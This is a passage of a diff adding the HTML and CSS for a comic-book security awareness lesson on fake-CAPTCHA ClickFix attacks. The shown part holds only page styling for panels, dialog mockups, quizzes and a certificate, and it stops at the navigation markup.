@@ -1,0 +1,2335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dude Diligence #1: The CAPTCHA Conspiracy | Circle 6 Systems</title>
+  <meta name="description" content="Comic book security awareness training on ClickFix social engineering attacks. Issue #1 of the Dude Diligence series by Circle 6 Systems.">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Bangers&family=Comic+Neue:ital,wght@0,300;0,400;0,700;1,400;1,700&display=swap');
+
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --ink: #1a1a1a;
+      --paper: #f5e6c8;
+      --paper-dark: #e8d5a8;
+      --paper-light: #faf3e3;
+      --caption: #f5deb3;
+      --accent: #c0392b;
+      --accent-light: rgba(192, 57, 43, 0.15);
+      --blue: #2c5f8a;
+      --blue-light: rgba(44, 95, 138, 0.12);
+      --green: #5a7a3a;
+      --green-light: rgba(90, 122, 58, 0.15);
+      --bubble-bg: #ffffff;
+      --font-comic: 'Bangers', Impact, 'Arial Black', sans-serif;
+      --font-body: 'Comic Neue', 'Comic Sans MS', cursive, sans-serif;
+      --font-caption: Georgia, 'Times New Roman', serif;
+      --c6-navy: #2d2a2e;
+      --c6-sage: #a8c196;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--font-body);
+      background: var(--paper-dark);
+      color: var(--ink);
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
+      min-height: 100vh;
+    }
+
+    /* Halftone overlay */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle, rgba(0,0,0,0.06) 1px, transparent 1px);
+      background-size: 4px 4px;
+      pointer-events: none;
+      z-index: 9999;
+    }
+
+    /* ===== Navigation ===== */
+    .nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      background: rgba(26, 26, 26, 0.95);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-bottom: 3px solid var(--accent);
+      z-index: 1000;
+      height: 56px;
+    }
+
+    .nav-inner {
+      max-width: 960px;
+      margin: 0 auto;
+      padding: 0 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 100%;
+    }
+
+    .nav-brand {
+      font-family: var(--font-comic);
+      font-size: 1.3rem;
+      color: var(--caption);
+      letter-spacing: 0.05em;
+      text-decoration: none;
+    }
+
+    .nav-brand span { color: var(--accent); }
+
+    .nav-progress {
+      display: flex;
+      align-items: center;
+      gap: 0.35rem;
+    }
+
+    .nav-dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+      background: rgba(245, 222, 179, 0.15);
+      cursor: pointer;
+      border: 1.5px solid rgba(245, 222, 179, 0.3);
+      transition: all 0.3s;
+      padding: 0;
+    }
+
+    .nav-dot.active {
+      background: var(--accent);
+      border-color: var(--accent);
+      box-shadow: 0 0 8px rgba(192, 57, 43, 0.5);
+      transform: scale(1.3);
+    }
+
+    .nav-dot.completed {
+      background: var(--c6-sage);
+      border-color: var(--c6-sage);
+    }
+
+    .nav-dot:hover { transform: scale(1.4); }
+
+    .progress-text {
+      font-family: var(--font-body);
+      font-size: 0.75rem;
+      color: var(--caption);
+      margin-left: 0.6rem;
+      font-weight: 700;
+    }
+
+    /* ===== Page system ===== */
+    main {
+      position: relative;
+      z-index: 1;
+      padding-top: 56px;
+    }
+
+    .page {
+      display: none;
+      animation: pageFlip 0.5s ease;
+    }
+
+    .page.active { display: block; }
+
+    @keyframes pageFlip {
+      from { opacity: 0; transform: translateX(30px) rotateY(5deg); }
+      to { opacity: 1; transform: translateX(0) rotateY(0); }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .page { animation: none; }
+    }
+
+    .page-inner {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem 3rem;
+    }
+
+    /* ===== Comic Panel Grid ===== */
+    .panel-grid {
+      display: grid;
+      gap: 12px;
+      margin: 1rem 0;
+    }
+
+    .panel-grid.two-col { grid-template-columns: 1fr 1fr; }
+    .panel-grid.three-col { grid-template-columns: 1fr 1fr 1fr; }
+    .panel-grid.wide-narrow { grid-template-columns: 2fr 1fr; }
+    .panel-grid.narrow-wide { grid-template-columns: 1fr 2fr; }
+    .panel-grid.four-col { grid-template-columns: 1fr 1fr 1fr 1fr; }
+    .panel-grid.single { grid-template-columns: 1fr; }
+
+    .panel {
+      background: var(--paper-light);
+      border: 3px solid var(--ink);
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.2);
+      padding: 1.25rem;
+      position: relative;
+      overflow: hidden;
+      min-height: 180px;
+    }
+
+    .panel.accent-bg { background: var(--accent-light); }
+    .panel.blue-bg { background: var(--blue-light); }
+    .panel.green-bg { background: var(--green-light); }
+    .panel.dark-bg { background: var(--ink); color: var(--paper); }
+    .panel.no-pad { padding: 0; }
+
+    .panel-full {
+      background: var(--paper-light);
+      border: 3px solid var(--ink);
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.2);
+      padding: 1.5rem;
+      position: relative;
+      overflow: hidden;
+      margin: 1rem 0;
+    }
+
+    /* ===== Speech Bubbles ===== */
+    .speech-bubble {
+      background: var(--bubble-bg);
+      border: 2.5px solid var(--ink);
+      border-radius: 18px;
+      padding: 0.75rem 1rem;
+      position: relative;
+      font-family: var(--font-body);
+      font-size: 0.95rem;
+      line-height: 1.5;
+      margin-bottom: 1.25rem;
+      max-width: 85%;
+    }
+
+    .speech-bubble::after {
+      content: '';
+      position: absolute;
+      bottom: -16px;
+      left: 24px;
+      width: 0; height: 0;
+      border-left: 12px solid transparent;
+      border-right: 12px solid transparent;
+      border-top: 16px solid var(--ink);
+    }
+
+    .speech-bubble::before {
+      content: '';
+      position: absolute;
+      bottom: -12px;
+      left: 26px;
+      width: 0; height: 0;
+      border-left: 10px solid transparent;
+      border-right: 10px solid transparent;
+      border-top: 14px solid var(--bubble-bg);
+      z-index: 1;
+    }
+
+    .speech-bubble.right {
+      margin-left: auto;
+    }
+
+    .speech-bubble.right::after {
+      left: auto;
+      right: 24px;
+    }
+
+    .speech-bubble.right::before {
+      left: auto;
+      right: 26px;
+    }
+
+    .speech-bubble.no-tail::after,
+    .speech-bubble.no-tail::before { display: none; }
+
+    .thought-bubble {
+      background: var(--bubble-bg);
+      border: 2.5px solid var(--ink);
+      border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;
+      padding: 0.75rem 1.25rem;
+      position: relative;
+      font-family: var(--font-body);
+      font-style: italic;
+      font-size: 0.95rem;
+      margin-bottom: 1.75rem;
+      max-width: 80%;
+    }
+
+    .thought-bubble::after {
+      content: '';
+      position: absolute;
+      bottom: -20px;
+      left: 30px;
+      width: 12px; height: 12px;
+      background: var(--bubble-bg);
+      border: 2.5px solid var(--ink);
+      border-radius: 50%;
+    }
+
+    .thought-bubble::before {
+      content: '';
+      position: absolute;
+      bottom: -32px;
+      left: 22px;
+      width: 8px; height: 8px;
+      background: var(--bubble-bg);
+      border: 2px solid var(--ink);
+      border-radius: 50%;
+      z-index: 1;
+    }
+
+    /* ===== Narrator Captions ===== */
+    .narrator {
+      background: var(--caption);
+      border: 2px solid var(--ink);
+      padding: 0.5rem 0.75rem;
+      font-family: var(--font-caption);
+      font-style: italic;
+      font-weight: 600;
+      font-size: 0.88rem;
+      line-height: 1.4;
+      margin-bottom: 0.75rem;
+      display: inline-block;
+    }
+
+    .narrator.wide {
+      display: block;
+    }
+
+    /* ===== Sound Effects ===== */
+    .sfx {
+      font-family: var(--font-comic);
+      font-size: 2.5rem;
+      color: var(--accent);
+      text-shadow: 3px 3px 0 var(--ink), -1px -1px 0 var(--ink), 1px -1px 0 var(--ink), -1px 1px 0 var(--ink);
+      transform: rotate(-5deg);
+      display: inline-block;
+      letter-spacing: 0.05em;
+      -webkit-text-stroke: 1px var(--ink);
+    }
+
+    .sfx.blue { color: var(--blue); }
+    .sfx.green { color: var(--green); }
+    .sfx.small { font-size: 1.5rem; }
+    .sfx.large { font-size: 3.5rem; }
+    .sfx.tilt-right { transform: rotate(8deg); }
+    .sfx.tilt-left { transform: rotate(-12deg); }
+
+    /* ===== Character Images ===== */
+    .char-img {
+      border: 3px solid var(--ink);
+      box-shadow: 3px 3px 0 rgba(0,0,0,0.2);
+      display: block;
+    }
+
+    .char-img.portrait {
+      width: 200px;
+      height: auto;
+    }
+
+    .char-img.medium {
+      width: 280px;
+      height: auto;
+    }
+
+    .char-img.full {
+      width: 100%;
+      height: auto;
+    }
+
+    .char-img.rounded { border-radius: 12px; }
+
+    /* ===== Cover Page ===== */
+    .cover {
+      background: linear-gradient(180deg, var(--ink) 0%, #2a1a0a 100%);
+      min-height: calc(100vh - 56px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .cover::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle, rgba(192, 57, 43, 0.08) 1px, transparent 1px);
+      background-size: 6px 6px;
+      pointer-events: none;
+    }
+
+    .cover-content {
+      text-align: center;
+      position: relative;
+      z-index: 2;
+      max-width: 700px;
+    }
+
+    .cover-masthead {
+      font-family: var(--font-comic);
+      font-size: clamp(3rem, 10vw, 6rem);
+      color: var(--caption);
+      letter-spacing: 0.08em;
+      line-height: 1;
+      text-shadow: 4px 4px 0 var(--accent), 7px 7px 0 rgba(0,0,0,0.4);
+      margin-bottom: 0.5rem;
+    }
+
+    .cover-issue {
+      display: inline-block;
+      background: var(--accent);
+      color: var(--paper);
+      font-family: var(--font-comic);
+      font-size: 1.1rem;
+      padding: 0.3rem 1rem;
+      border-radius: 4px;
+      letter-spacing: 0.1em;
+      margin-bottom: 1.5rem;
+      border: 2px solid var(--paper);
+    }
+
+    .cover-portrait {
+      width: 240px;
+      height: 240px;
+      object-fit: cover;
+      border: 4px solid var(--caption);
+      border-radius: 50%;
+      box-shadow: 0 0 40px rgba(192, 57, 43, 0.3), 0 0 80px rgba(192, 57, 43, 0.1);
+      margin: 1rem auto;
+      display: block;
+    }
+
+    .cover-title {
+      font-family: var(--font-comic);
+      font-size: clamp(1.5rem, 5vw, 2.8rem);
+      color: var(--accent);
+      letter-spacing: 0.06em;
+      line-height: 1.2;
+      margin: 1rem 0 0.5rem;
+      text-shadow: 2px 2px 0 rgba(0,0,0,0.5);
+    }
+
+    .cover-tagline {
+      font-family: var(--font-body);
+      font-size: 1.1rem;
+      color: var(--paper-dark);
+      font-style: italic;
+      margin-bottom: 2rem;
+    }
+
+    .cover-start-btn {
+      display: inline-block;
+      background: var(--accent);
+      color: var(--paper);
+      font-family: var(--font-comic);
+      font-size: 1.4rem;
+      letter-spacing: 0.08em;
+      padding: 0.75rem 2.5rem;
+      border: 3px solid var(--paper);
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-decoration: none;
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.4);
+    }
+
+    .cover-start-btn:hover {
+      transform: translate(-2px, -2px);
+      box-shadow: 6px 6px 0 rgba(0,0,0,0.4);
+      background: #d44637;
+    }
+
+    .cover-start-btn:active {
+      transform: translate(2px, 2px);
+      box-shadow: 1px 1px 0 rgba(0,0,0,0.4);
+    }
+
+    .cover-footer {
+      font-family: var(--font-caption);
+      font-size: 0.75rem;
+      color: rgba(245, 230, 200, 0.4);
+      margin-top: 2rem;
+    }
+
+    /* ===== Page Navigation ===== */
+    .page-nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 2rem;
+      padding-top: 1rem;
+      border-top: 2px dashed rgba(26, 26, 26, 0.2);
+    }
+
+    .page-btn {
+      font-family: var(--font-comic);
+      font-size: 1.1rem;
+      letter-spacing: 0.06em;
+      padding: 0.6rem 1.5rem;
+      background: var(--ink);
+      color: var(--paper);
+      border: 3px solid var(--ink);
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s;
+      box-shadow: 3px 3px 0 rgba(0,0,0,0.2);
+    }
+
+    .page-btn:hover {
+      background: var(--accent);
+      transform: translate(-1px, -1px);
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.3);
+    }
+
+    .page-btn:active {
+      transform: translate(1px, 1px);
+      box-shadow: 1px 1px 0 rgba(0,0,0,0.2);
+    }
+
+    .page-btn:disabled {
+      opacity: 0.3;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    .page-btn:disabled:hover {
+      background: var(--ink);
+    }
+
+    .page-indicator {
+      font-family: var(--font-comic);
+      font-size: 1rem;
+      color: var(--ink);
+      opacity: 0.6;
+      letter-spacing: 0.05em;
+    }
+
+    /* ===== Typography ===== */
+    .comic-title {
+      font-family: var(--font-comic);
+      font-size: clamp(1.8rem, 4vw, 2.5rem);
+      color: var(--ink);
+      letter-spacing: 0.04em;
+      line-height: 1.2;
+      margin-bottom: 0.75rem;
+    }
+
+    .comic-title .red { color: var(--accent); }
+    .comic-title .blue { color: var(--blue); }
+
+    .comic-subtitle {
+      font-family: var(--font-comic);
+      font-size: 1.3rem;
+      letter-spacing: 0.04em;
+      margin-bottom: 0.5rem;
+    }
+
+    .body-text {
+      font-family: var(--font-body);
+      font-size: 1rem;
+      line-height: 1.7;
+      margin-bottom: 0.75rem;
+    }
+
+    .bold { font-weight: 700; }
+    .italic { font-style: italic; }
+    .text-red { color: var(--accent); }
+    .text-blue { color: var(--blue); }
+    .text-green { color: var(--green); }
+    .text-center { text-align: center; }
+
+    /* ===== Fake Browser / Dialog Mockups ===== */
+    .browser-mockup {
+      border: 2.5px solid var(--ink);
+      border-radius: 8px 8px 4px 4px;
+      overflow: hidden;
+      background: #fff;
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.15);
+      margin: 0.75rem 0;
+    }
+
+    .browser-bar {
+      background: #e8e8e8;
+      border-bottom: 2px solid var(--ink);
+      padding: 0.4rem 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .browser-dots {
+      display: flex;
+      gap: 4px;
+    }
+
+    .browser-dots span {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+      border: 1.5px solid #999;
+    }
+
+    .browser-dots span:nth-child(1) { background: #ff5f57; }
+    .browser-dots span:nth-child(2) { background: #ffbd2e; }
+    .browser-dots span:nth-child(3) { background: #28ca41; }
+
+    .browser-url {
+      flex: 1;
+      background: #fff;
+      border: 1.5px solid #ccc;
+      border-radius: 3px;
+      padding: 0.2rem 0.5rem;
+      font-family: monospace;
+      font-size: 0.75rem;
+      color: #666;
+    }
+
+    .browser-url .danger { color: var(--accent); font-weight: 700; }
+
+    .browser-body {
+      padding: 1.5rem;
+      text-align: center;
+      font-family: var(--font-body);
+    }
+
+    .dialog-mockup {
+      background: #f0f0f0;
+      border: 2.5px solid var(--ink);
+      border-radius: 6px;
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.15);
+      overflow: hidden;
+      margin: 0.75rem 0;
+    }
+
+    .dialog-titlebar {
+      background: #ddd;
+      border-bottom: 2px solid var(--ink);
+      padding: 0.3rem 0.6rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-family: var(--font-body);
+      font-size: 0.8rem;
+      font-weight: 700;
+    }
+
+    .dialog-close {
+      font-size: 1rem;
+      line-height: 1;
+      cursor: default;
+    }
+
+    .dialog-body {
+      padding: 1.25rem;
+      font-family: var(--font-body);
+      font-size: 0.9rem;
+    }
+
+    /* Fake CAPTCHA styling */
+    .fake-captcha {
+      background: #f9f9f9;
+      border: 2px solid #d3d3d3;
+      border-radius: 4px;
+      padding: 1rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.75rem;
+      margin: 0.5rem 0;
+    }
+
+    .captcha-checkbox {
+      width: 24px; height: 24px;
+      border: 2px solid #c1c1c1;
+      border-radius: 3px;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.8rem;
+    }
+
+    .captcha-label {
+      font-family: Arial, sans-serif;
+      font-size: 0.9rem;
+      color: #333;
+    }
+
+    .captcha-logo {
+      margin-left: auto;
+      font-size: 0.6rem;
+      color: #999;
+      text-align: center;
+      line-height: 1.2;
+    }
+
+    .captcha-logo .recaptcha-icon {
+      font-size: 1.5rem;
+      display: block;
+    }
+
+    /* Win+R dialog */
+    .run-dialog {
+      background: #f0f0f0;
+      border: 2.5px solid var(--ink);
+      border-radius: 4px;
+      padding: 1rem;
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.15);
+      margin: 0.5rem 0;
+    }
+
+    .run-dialog-title {
+      font-family: var(--font-body);
+      font-weight: 700;
+      font-size: 0.85rem;
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .run-dialog-input {
+      width: 100%;
+      background: #fff;
+      border: 1.5px solid #999;
+      padding: 0.3rem 0.5rem;
+      font-family: monospace;
+      font-size: 0.7rem;
+      color: var(--accent);
+      margin-bottom: 0.5rem;
+      word-break: break-all;
+    }
+
+    .run-dialog-buttons {
+      display: flex;
+      gap: 0.4rem;
+      justify-content: flex-end;
+    }
+
+    .run-dialog-buttons button {
+      font-family: var(--font-body);
+      font-size: 0.75rem;
+      padding: 0.25rem 0.75rem;
+      background: #e0e0e0;
+      border: 1.5px solid #999;
+      border-radius: 2px;
+      cursor: default;
+    }
+
+    /* ===== Attack Step Cards ===== */
+    .attack-step {
+      display: flex;
+      gap: 1rem;
+      align-items: flex-start;
+      margin-bottom: 1.25rem;
+    }
+
+    .step-num {
+      width: 44px; height: 44px;
+      min-width: 44px;
+      background: var(--accent);
+      color: var(--paper);
+      font-family: var(--font-comic);
+      font-size: 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2.5px solid var(--ink);
+      border-radius: 50%;
+    }
+
+    .step-content {
+      flex: 1;
+    }
+
+    .step-title {
+      font-family: var(--font-comic);
+      font-size: 1.15rem;
+      letter-spacing: 0.03em;
+      margin-bottom: 0.2rem;
+    }
+
+    .step-desc {
+      font-family: var(--font-body);
+      font-size: 0.92rem;
+      line-height: 1.5;
+    }
+
+    /* ===== Scenario Vote Cards ===== */
+    .scenario-card {
+      background: var(--paper-light);
+      border: 3px solid var(--ink);
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.2);
+      padding: 1.25rem;
+      margin-bottom: 1.5rem;
+      position: relative;
+    }
+
+    .scenario-num {
+      position: absolute;
+      top: -12px;
+      left: 16px;
+      background: var(--blue);
+      color: var(--paper);
+      font-family: var(--font-comic);
+      font-size: 0.9rem;
+      padding: 0.15rem 0.75rem;
+      border: 2px solid var(--ink);
+      border-radius: 3px;
+      letter-spacing: 0.05em;
+    }
+
+    .scenario-content {
+      margin-top: 0.75rem;
+    }
+
+    .scenario-question {
+      font-family: var(--font-comic);
+      font-size: 1.1rem;
+      letter-spacing: 0.03em;
+      margin: 0.75rem 0;
+      text-align: center;
+    }
+
+    .vote-buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+      margin: 0.75rem 0;
+    }
+
+    .vote-btn {
+      font-family: var(--font-comic);
+      font-size: 1.1rem;
+      letter-spacing: 0.06em;
+      padding: 0.5rem 2rem;
+      border: 2.5px solid var(--ink);
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s;
+      box-shadow: 3px 3px 0 rgba(0,0,0,0.15);
+    }
+
+    .vote-btn.yes {
+      background: var(--accent-light);
+      color: var(--accent);
+    }
+
+    .vote-btn.no {
+      background: var(--green-light);
+      color: var(--green);
+    }
+
+    .vote-btn:hover {
+      transform: translate(-1px, -1px);
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.2);
+    }
+
+    .vote-btn:active {
+      transform: translate(1px, 1px);
+      box-shadow: 1px 1px 0;
+    }
+
+    .scenario-result {
+      display: none;
+      margin-top: 0.75rem;
+      padding: 0.75rem 1rem;
+      border: 2.5px solid var(--ink);
+      border-radius: 6px;
+      font-family: var(--font-body);
+      font-size: 0.95rem;
+      line-height: 1.5;
+    }
+
+    .scenario-result.show { display: block; }
+
+    .scenario-result.correct {
+      background: var(--green-light);
+      border-color: var(--green);
+    }
+
+    .scenario-result.incorrect {
+      background: var(--accent-light);
+      border-color: var(--accent);
+    }
+
+    .result-verdict {
+      font-family: var(--font-comic);
+      font-size: 1.2rem;
+      letter-spacing: 0.04em;
+      margin-bottom: 0.3rem;
+    }
+
+    .result-verdict.correct { color: var(--green); }
+    .result-verdict.incorrect { color: var(--accent); }
+
+    /* ===== Defense Rules ===== */
+    .defense-rule {
+      display: flex;
+      gap: 1rem;
+      align-items: flex-start;
+      background: var(--paper-light);
+      border: 2.5px solid var(--ink);
+      padding: 1rem;
+      margin-bottom: 0.75rem;
+      box-shadow: 3px 3px 0 rgba(0,0,0,0.1);
+    }
+
+    .rule-icon {
+      width: 48px; height: 48px;
+      min-width: 48px;
+      background: var(--blue-light);
+      border: 2px solid var(--blue);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.3rem;
+    }
+
+    /* ===== Quiz ===== */
+    .quiz-question {
+      background: var(--paper-light);
+      border: 3px solid var(--ink);
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.2);
+      padding: 1.25rem;
+      margin-bottom: 1.5rem;
+      position: relative;
+    }
+
+    .quiz-num {
+      font-family: var(--font-comic);
+      font-size: 1.1rem;
+      color: var(--blue);
+      letter-spacing: 0.04em;
+      margin-bottom: 0.4rem;
+    }
+
+    .quiz-text {
+      font-family: var(--font-body);
+      font-weight: 700;
+      font-size: 1.05rem;
+      margin-bottom: 0.75rem;
+      line-height: 1.5;
+    }
+
+    .quiz-options {
+      display: flex;
+      flex-direction: column;
+      gap: 0.4rem;
+    }
+
+    .quiz-option {
+      display: block;
+      width: 100%;
+      text-align: left;
+      font-family: var(--font-body);
+      font-size: 0.95rem;
+      padding: 0.6rem 0.85rem;
+      background: var(--paper);
+      border: 2px solid var(--ink);
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    .quiz-option:hover {
+      background: var(--blue-light);
+      border-color: var(--blue);
+    }
+
+    .quiz-option.selected {
+      background: var(--blue-light);
+      border-color: var(--blue);
+      font-weight: 700;
+    }
+
+    .quiz-option.correct-answer {
+      background: var(--green-light);
+      border-color: var(--green);
+      font-weight: 700;
+    }
+
+    .quiz-option.wrong-answer {
+      background: var(--accent-light);
+      border-color: var(--accent);
+      text-decoration: line-through;
+      opacity: 0.7;
+    }
+
+    .quiz-option:disabled {
+      cursor: default;
+    }
+
+    .quiz-explanation {
+      display: none;
+      margin-top: 0.6rem;
+      padding: 0.6rem 0.75rem;
+      background: var(--caption);
+      border: 2px solid var(--ink);
+      font-family: var(--font-body);
+      font-size: 0.88rem;
+      line-height: 1.5;
+      font-style: italic;
+    }
+
+    .quiz-explanation.show { display: block; }
+
+    .quiz-score-area {
+      text-align: center;
+      padding: 1.5rem;
+      margin-top: 1rem;
+    }
+
+    .quiz-submit-btn {
+      font-family: var(--font-comic);
+      font-size: 1.3rem;
+      letter-spacing: 0.06em;
+      padding: 0.7rem 2.5rem;
+      background: var(--accent);
+      color: var(--paper);
+      border: 3px solid var(--ink);
+      border-radius: 4px;
+      cursor: pointer;
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.2);
+      transition: all 0.2s;
+    }
+
+    .quiz-submit-btn:hover {
+      transform: translate(-1px, -1px);
+      box-shadow: 5px 5px 0 rgba(0,0,0,0.25);
+    }
+
+    .quiz-submit-btn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+
+    .quiz-result {
+      display: none;
+      margin-top: 1rem;
+    }
+
+    .quiz-result.show { display: block; }
+
+    .score-display {
+      font-family: var(--font-comic);
+      font-size: 3rem;
+      letter-spacing: 0.04em;
+    }
+
+    .score-display.great { color: var(--green); }
+    .score-display.ok { color: var(--blue); }
+    .score-display.needs-work { color: var(--accent); }
+
+    .dude-comment {
+      background: var(--bubble-bg);
+      border: 2.5px solid var(--ink);
+      border-radius: 18px;
+      padding: 0.75rem 1rem;
+      font-family: var(--font-body);
+      font-size: 0.95rem;
+      max-width: 500px;
+      margin: 1rem auto;
+      text-align: center;
+    }
+
+    /* ===== Certificate ===== */
+    .certificate {
+      background: var(--paper-light);
+      border: 4px double var(--ink);
+      padding: 2.5rem;
+      text-align: center;
+      position: relative;
+      margin: 1rem 0;
+      box-shadow: 6px 6px 0 rgba(0,0,0,0.15);
+    }
+
+    .certificate::before {
+      content: '';
+      position: absolute;
+      inset: 8px;
+      border: 2px solid var(--ink);
+      pointer-events: none;
+    }
+
+    .cert-header {
+      font-family: var(--font-comic);
+      font-size: clamp(1.5rem, 4vw, 2.5rem);
+      letter-spacing: 0.06em;
+      color: var(--accent);
+      margin-bottom: 0.5rem;
+    }
+
+    .cert-sub {
+      font-family: var(--font-caption);
+      font-style: italic;
+      font-size: 1rem;
+      color: #666;
+      margin-bottom: 1.5rem;
+    }
+
+    .cert-body {
+      font-family: var(--font-body);
+      font-size: 1.1rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .cert-name-input {
+      font-family: var(--font-comic);
+      font-size: 1.8rem;
+      letter-spacing: 0.04em;
+      text-align: center;
+      border: none;
+      border-bottom: 3px solid var(--ink);
+      background: transparent;
+      padding: 0.3rem 1rem;
+      width: 70%;
+      max-width: 400px;
+      margin: 0.5rem 0 1.5rem;
+      color: var(--blue);
+    }
+
+    .cert-name-input:focus {
+      outline: none;
+      border-bottom-color: var(--accent);
+    }
+
+    .cert-name-input::placeholder {
+      color: #bbb;
+      font-size: 1.2rem;
+    }
+
+    .cert-issue {
+      font-family: var(--font-comic);
+      font-size: 1rem;
+      letter-spacing: 0.05em;
+      color: var(--ink);
+      margin-bottom: 0.5rem;
+    }
+
+    .cert-date {
+      font-family: var(--font-caption);
+      font-size: 0.9rem;
+      color: #666;
+      margin-bottom: 1rem;
+    }
+
+    .cert-stamp {
+      display: inline-block;
+      border: 3px solid var(--accent);
+      border-radius: 50%;
+      width: 90px; height: 90px;
+      line-height: 90px;
+      font-family: var(--font-comic);
+      font-size: 0.85rem;
+      color: var(--accent);
+      letter-spacing: 0.05em;
+      transform: rotate(-12deg);
+      margin: 0.75rem 0;
+    }
+
+    .cert-footer {
+      font-family: var(--font-caption);
+      font-size: 0.75rem;
+      color: #999;
+      margin-top: 1rem;
+    }
+
+    .print-btn {
+      font-family: var(--font-comic);
+      font-size: 1.1rem;
+      letter-spacing: 0.06em;
+      padding: 0.6rem 2rem;
+      background: var(--blue);
+      color: var(--paper);
+      border: 3px solid var(--ink);
+      border-radius: 4px;
+      cursor: pointer;
+      box-shadow: 3px 3px 0 rgba(0,0,0,0.2);
+      transition: all 0.2s;
+      margin-top: 1rem;
+    }
+
+    .print-btn:hover {
+      background: #3a7ab5;
+      transform: translate(-1px, -1px);
+      box-shadow: 4px 4px 0 rgba(0,0,0,0.25);
+    }
+
+    /* ===== Flex/Grid utilities ===== */
+    .flex { display: flex; }
+    .flex-center { display: flex; align-items: center; justify-content: center; }
+    .flex-col { flex-direction: column; }
+    .gap-sm { gap: 0.5rem; }
+    .gap-md { gap: 1rem; }
+    .gap-lg { gap: 1.5rem; }
+    .items-center { align-items: center; }
+    .items-start { align-items: flex-start; }
+    .justify-center { justify-content: center; }
+    .mt-1 { margin-top: 1rem; }
+    .mt-2 { margin-top: 2rem; }
+    .mb-1 { margin-bottom: 1rem; }
+    .mb-2 { margin-bottom: 2rem; }
+
+    /* ===== Site Footer ===== */
+    .site-footer {
+      text-align: center;
+      padding: 2rem;
+      font-family: var(--font-caption);
+      font-size: 0.75rem;
+      color: rgba(26, 26, 26, 0.4);
+      border-top: 2px solid rgba(26, 26, 26, 0.1);
+    }
+
+    .site-footer a {
+      color: var(--c6-navy);
+      text-decoration: none;
+    }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 768px) {
+      .panel-grid.two-col,
+      .panel-grid.three-col,
+      .panel-grid.wide-narrow,
+      .panel-grid.narrow-wide,
+      .panel-grid.four-col {
+        grid-template-columns: 1fr;
+      }
+
+      .page-inner {
+        padding: 1.25rem 1rem 2rem;
+      }
+
+      .cover-masthead { font-size: 2.5rem; }
+      .cover-portrait { width: 180px; height: 180px; }
+      .speech-bubble, .thought-bubble { max-width: 95%; }
+      .char-img.portrait { width: 150px; }
+      .char-img.medium { width: 200px; }
+      .sfx { font-size: 2rem; }
+      .sfx.large { font-size: 2.5rem; }
+
+      .attack-step {
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+      }
+
+      .defense-rule {
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+      }
+
+      .cert-name-input { width: 90%; font-size: 1.3rem; }
+    }
+
+    @media (max-width: 480px) {
+      .vote-buttons { flex-direction: column; }
+      .vote-btn { width: 100%; }
+      .nav-brand { font-size: 1rem; }
+    }
+
+    /* ===== Print ===== */
+    @media print {
+      body { background: #fff; }
+      body::before { display: none; }
+      .nav { display: none; }
+      .page-nav { display: none; }
+      .site-footer { display: none; }
+      main { padding-top: 0; }
+      .page { display: block !important; animation: none; page-break-after: always; }
+      .page:first-child { display: none !important; } /* skip cover in print */
+      .panel, .panel-full, .scenario-card, .quiz-question, .defense-rule {
+        box-shadow: none;
+        break-inside: avoid;
+      }
+      .vote-btn, .quiz-option, .quiz-submit-btn, .print-btn { display: none; }
+      .scenario-result, .quiz-explanation { display: block !important; }
+      .certificate { break-inside: avoid; box-shadow: none; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ===== NAVIGATION ===== -->
+<nav class="nav" role="navigation" aria-label="Page navigation">
+  <div class="nav-inner">
